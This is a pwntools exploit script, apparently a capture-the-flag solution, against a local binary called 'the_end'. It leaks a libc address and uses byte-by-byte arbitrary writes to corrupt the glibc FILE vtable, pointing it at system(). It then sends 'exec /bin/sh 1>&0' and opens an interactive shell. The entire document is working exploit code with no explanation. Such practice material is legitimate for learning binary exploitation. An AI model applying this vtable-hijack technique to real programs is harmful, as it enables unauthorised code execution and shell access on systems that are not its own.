from pwn import *
context(log_level='debug',arch='amd64')

p = process("./the_end")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./the_end")

p.recvuntil("gift ")
sleep_addr = int(p.recv(14),16)
libc_base = sleep_addr-libc.sym['sleep']
log.info("libc_base:"+hex(libc_base))
vtables = libc_base+0x3C56F8#libc.sym['_IO_file_jumps']
log.info("vtables:"+hex(vtables))
one_gadget = libc_base + libc.sym['system']#0x45226

fake_vtable = libc_base + 0x3c5588
target_addr = libc_base + 0x3c55e0
log.info("fake_vtable:"+hex(fake_vtable))

for i in range(2):
    p.send(p64(vtables+i))
    p.send(p64(fake_vtable)[i])


# gdb.attach(p)
# pause()

for i in range(3):
    p.send(p64(target_addr+i))
    p.send(p64(one_gadget)[i])

p.sendline("exec /bin/sh 1>&0")




p.interactive()